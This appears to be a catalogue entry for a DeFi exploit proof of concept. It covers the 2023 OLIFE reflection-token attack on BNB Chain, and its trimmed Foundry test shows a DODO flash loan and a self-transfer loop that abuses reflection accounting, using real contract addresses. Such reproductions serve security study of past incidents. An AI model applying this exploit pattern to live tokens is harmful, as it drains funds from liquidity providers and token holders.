# [?] OLIFE - Reflection token

## Summary
Severity: Unknown
Chain: BNB Chain
Component: OLIFE
Published: 2023-04-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/OLIFE_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~32 WBNB
References:
- https://twitter.com/BeosinAlert/status/1648520494516420608
- https://bscscan.com/tx/0xa21692ffb561767a74a4cbd1b78ad48151d710efab723b1efa5f1e0147caab0a

```solidity
contract ContractTest is Test {
    uint256 internal constant FLASHLOAN_WBNB_AMOUNT = 969 * 1e18;

    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IOceanLife constant OLIFE = IOceanLife(0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa);
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant OLIFE_WBNB_LPPool = IPancakePair(0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84);

    address constant dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork("bsc", 27_470_678);
    }

    function testExploit() external {
        DVM(dodo).flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function loopTransfer(
        uint256 num
    ) internal {
        uint256 i;
        while (i < num) {
            uint256 amount = OLIFE.balanceOf(address(this));
            OLIFE.transfer(address(this), amount);
            i++;
        }
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/OLIFE_exp.sol_
